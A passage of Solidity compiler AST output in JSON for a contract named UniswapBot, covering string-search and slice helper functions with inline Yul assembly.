																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 218,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "2823:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 220,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2823:18:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "2869:45:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "2871:41:0",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "needleptr",
																										"nodeType": "YulIdentifier",
																										"src": "2895:9:0"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "2889:5:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "2889:16:0"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "2907:4:0"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "2885:3:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "2885:27:0"
																					},
																					"variableNames": [
																						{
																							"name": "needledata",
																							"nodeType": "YulIdentifier",
																							"src": "2871:10:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 200,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "2907:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 219,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "2871:10:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 181,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "2895:9:0",
																				"valueSize": 1
																			}
																		],
																		"id": 221,
																		"nodeType": "InlineAssembly",
																		"src": "2860:54:0"
																	},
																	{
																		"assignments": [
																			223
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 223,
																				"mutability": "mutable",
																				"name": "end",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 253,
																				"src": "2934:8:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 222,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "2934:4:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 229,
																		"initialValue": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 228,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 226,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 224,
																					"name": "selfptr",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 177,
																					"src": "2945:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 225,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 175,
																					"src": "2955:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "2945:17:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 227,
																				"name": "needlelen",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 179,
																				"src": "2965:9:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "2945:29:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2934:40:0"
																	},
																	{
																		"assignments": [
																			231
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 231,
																				"mutability": "mutable",
																				"name": "ptrdata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 253,
																				"src": "2993:15:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 230,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "2993:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 232,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2993:15:0"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "3036:36:0",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "3038:32:0",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "ptr",
																										"nodeType": "YulIdentifier",
																										"src": "3059:3:0"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "3053:5:0"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "3053:10:0"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "3065:4:0"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "3049:3:0"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "3049:21:0"
																					},
																					"variableNames": [
																						{
																							"name": "ptrdata",
																							"nodeType": "YulIdentifier",
																							"src": "3038:7:0"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 200,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3065:4:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 187,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3059:3:0",
																				"valueSize": 1
																			},
																			{
																				"declaration": 231,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3038:7:0",
																				"valueSize": 1
																			}
																		],
																		"id": 233,
																		"nodeType": "InlineAssembly",
																		"src": "3027:45:0"
																	},
																	{
																		"body": {
																			"id": 249,
																			"nodeType": "Block",
																			"src": "3122:203:0",
																			"statements": [
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 239,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 237,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 187,
																							"src": "3149:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": ">=",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 238,
																							"name": "end",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 223,
																							"src": "3156:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "3149:10:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 244,
																					"nodeType": "IfStatement",
																					"src": "3145:65:0",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"commonType": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"id": 242,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftExpression": {
																								"argumentTypes": null,
																								"id": 240,
																								"name": "selfptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 177,
																								"src": "3193:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "BinaryOperation",
																							"operator": "+",
																							"rightExpression": {
																								"argumentTypes": null,
																								"id": 241,
																								"name": "selflen",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 175,
																								"src": "3203:7:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"src": "3193:17:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 185,
																						"id": 243,
																						"nodeType": "Return",
																						"src": "3186:24:0"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 246,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "UnaryOperation",
																						"operator": "++",
																						"prefix": false,
																						"src": "3233:5:0",
																						"subExpression": {
																							"argumentTypes": null,
																							"id": 245,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 187,
																							"src": "3233:3:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 247,
																					"nodeType": "ExpressionStatement",
																					"src": "3233:5:0"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "3270:36:0",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "3272:32:0",
																								"value": {
																									"arguments": [
																										{
																											"arguments": [
																												{
																													"name": "ptr",
																													"nodeType": "YulIdentifier",
																													"src": "3293:3:0"
																												}
																											],
																											"functionName": {
																												"name": "mload",
																												"nodeType": "YulIdentifier",
																												"src": "3287:5:0"
																											},
																											"nodeType": "YulFunctionCall",
																											"src": "3287:10:0"
																										},
																										{
																											"name": "mask",
																											"nodeType": "YulIdentifier",
																											"src": "3299:4:0"
																										}
																									],
																									"functionName": {
																										"name": "and",
																										"nodeType": "YulIdentifier",
																										"src": "3283:3:0"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "3283:21:0"
																								},
																								"variableNames": [
																									{
																										"name": "ptrdata",
																										"nodeType": "YulIdentifier",
																										"src": "3272:7:0"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 200,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3299:4:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 187,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3293:3:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 231,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3272:7:0",
																							"valueSize": 1
																						}
																					],
																					"id": 248,
																					"nodeType": "InlineAssembly",
																					"src": "3261:45:0"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			},
																			"id": 236,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 234,
																				"name": "ptrdata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 231,
																				"src": "3099:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 235,
																				"name": "needledata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 219,
																				"src": "3110:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"src": "3099:21:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 250,
																		"nodeType": "WhileStatement",
																		"src": "3092:233:0"
																	},
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 251,
																			"name": "ptr",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 187,
																			"src": "3350:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"functionReturnParameters": 185,
																		"id": 252,
																		"nodeType": "Return",
																		"src": "3343:10:0"
																	}
																]
															}
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 292,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 290,
														"name": "selfptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 177,
														"src": "3881:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 291,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 175,
														"src": "3891:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3881:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 185,
												"id": 293,
												"nodeType": "Return",
												"src": "3874:24:0"
											}
										]
									},
									"documentation": null,
									"id": 295,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findContracts",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 182,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 175,
												"mutability": "mutable",
												"name": "selflen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 295,
												"src": "2514:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 174,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2514:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 177,
												"mutability": "mutable",
												"name": "selfptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 295,
												"src": "2528:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 176,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2528:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 179,
												"mutability": "mutable",
												"name": "needlelen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 295,
												"src": "2542:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 178,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2542:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 181,
												"mutability": "mutable",
												"name": "needleptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 295,
												"src": "2558:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 180,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2558:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2513:60:0"
									},
									"returnParameters": {
										"id": 185,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 184,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 295,
												"src": "2596:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 183,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2596:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2595:6:0"
									},
									"scope": 1578,
									"src": "2491:1415:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 312,
										"nodeType": "Block",
										"src": "4130:133:0",
										"statements": [
											{
												"assignments": [
													303
												],
												"declarations": [
													{
														"constant": false,
														"id": 303,
														"mutability": "mutable",
														"name": "ret",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 312,
														"src": "4141:17:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 302,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "4141:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 305,
												"initialValue": {
													"argumentTypes": null,
													"id": 304,
													"name": "self",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 297,
													"src": "4161:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4141:24:0"
											},
											{
												"assignments": [
													307
												],
												"declarations": [
													{
														"constant": false,
														"id": 307,
														"mutability": "mutable",
														"name": "retptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 312,
														"src": "4176:11:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 306,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4176:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 308,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "4176:11:0"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "4207:26:0",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "4209:22:0",
															"value": {
																"arguments": [
																	{
																		"name": "ret",
																		"nodeType": "YulIdentifier",
																		"src": "4223:3:0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4228:2:0",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "4219:3:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "4219:12:0"
															},
															"variableNames": [
																{
																	"name": "retptr",
																	"nodeType": "YulIdentifier",
																	"src": "4209:6:0"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 303,
														"isOffset": false,
														"isSlot": false,
														"src": "4223:3:0",
														"valueSize": 1
													},
													{
														"declaration": 307,
														"isOffset": false,
														"isSlot": false,
														"src": "4209:6:0",
														"valueSize": 1
													}
												],
												"id": 309,
												"nodeType": "InlineAssembly",
												"src": "4198:35:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 310,
													"name": "ret",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 303,
													"src": "4252:3:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 301,
												"id": 311,
												"nodeType": "Return",
												"src": "4245:10:0"
											}
										]
									},
									"documentation": null,
									"id": 313,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "loadCurrentContract",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 298,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 297,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 313,
												"src": "4072:18:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 296,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4072:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4071:20:0"
									},
									"returnParameters": {
										"id": 301,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 300,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 313,
												"src": "4115:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 299,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4115:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4114:15:0"
									},
									"scope": 1578,
									"src": "4043:220:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 430,
										"nodeType": "Block",
										"src": "4566:819:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 327,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 322,
															"name": "rune",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 317,
															"src": "4577:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 324,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 23,
														"src": "4577:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 325,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 315,
															"src": "4589:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 326,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 23,
														"src": "4589:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4577:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 328,
												"nodeType": "ExpressionStatement",
												"src": "4577:21:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 332,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 329,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 315,
															"src": "4615:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 330,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 21,
														"src": "4615:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 331,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "4628:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "4615:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 342,
												"nodeType": "IfStatement",
												"src": "4611:86:0",
												"trueBody": {
													"id": 341,
													"nodeType": "Block",
													"src": "4631:66:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 337,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 333,
																		"name": "rune",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 317,
																		"src": "4646:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 335,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 21,
																	"src": "4646:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 336,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4658:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "4646:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 338,
															"nodeType": "ExpressionStatement",
															"src": "4646:13:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 339,
																"name": "rune",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 317,
																"src": "4681:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$24_memory_ptr",
																	"typeString": "struct UniswapBot.slice memory"
																}
															},
															"functionReturnParameters": 321,
															"id": 340,
															"nodeType": "Return",
															"src": "4674:11:0"
														}
													]
												}
											},
											{
												"assignments": [
													344
												],
												"declarations": [
													{
														"constant": false,
														"id": 344,
														"mutability": "mutable",
														"name": "l",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 430,
														"src": "4709:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 343,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4709:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 345,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "4709:6:0"
											},
											{
												"assignments": [
													347
												],
												"declarations": [
													{
														"constant": false,
														"id": 347,
														"mutability": "mutable",
														"name": "b",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 430,
														"src": "4726:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 346,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4726:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 348,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "4726:6:0"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "4815:56:0",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "4817:52:0",
															"value": {
